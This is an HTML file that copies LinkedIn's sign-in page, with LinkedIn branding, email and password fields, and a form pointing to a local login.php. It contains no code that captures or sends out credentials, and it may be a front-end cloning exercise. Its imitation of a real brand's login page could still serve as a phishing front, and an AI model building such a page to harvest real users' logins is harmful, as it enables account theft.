<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>LinkedIn Login, Sign In | LinkedIn</title>
  <link rel="stylesheet" href="style.css">
  <script type="module" src="login.js"></script>
  <link rel="icon" type="image/png" href="images/LinkedIn-icon.png">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
  <div class="logo">
    <img src="images/LinkedIn-logo.png" alt="LinkedIn Logo" />
  </div>

  <div class="page-content">
    <div class="form-container">
      <h1>Sign in</h1>
       <form method="POST" action="login.php"></form>
       <div class="emailContainer">
        <div class="emailLabelContainer">
          <input id="email" type="text" class="emailField" placeholder="Email or phone" />
          <label class="emailLabel">Email or phone</label>
        </div>
        <small id="emailError" class="error"></small>
       </div>

      <div class="passwordContainer">
        <div class="passwordLabelContainer">
          <span id="togglePassword" class="togglePassword">Show</span>
          <input id="password" class="passwordField" type="password" placeholder="Password" />
          <label class="passwordLabel">Password</label>
        </div>

        <small id="passwordError" class="error"></small>
      </div>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>

      <div class="loggedIn">
        <label><input type="checkbox" class="checkboxBox"/><p>Keep me logged in</p></label>
      </div>

      <button id ="signInBtn" button class="signIn-Btn" type="submit">Sign in</button>
    </div>

    <div class="joinNow">
      <p>New to LinkedIn? </p>
      <a href="#">Join now</a>
    </div>
  </div>

  <footer>
    <div class="copyrightSection">
      <img src="images/LinkedIn-footer.png" class="linkedInFooterImage">
      <p>© 2025 </p>
    </div>
    <a href="#">User Agreement</a>
    <a href="#">Privacy Policy</a>
    <a href="#">Community Guidelines</a>
    <a href="#">Cookie Policy</a>
    <a href="#">Copyright Policy</a>
    <a href="#">Send Feedback</a>
    <div class="languageSection">
      <a href="#"class="languageFooter">Language <p>&nbsp;v</p></a>
    </div>
  </footer>
</body>
</html>
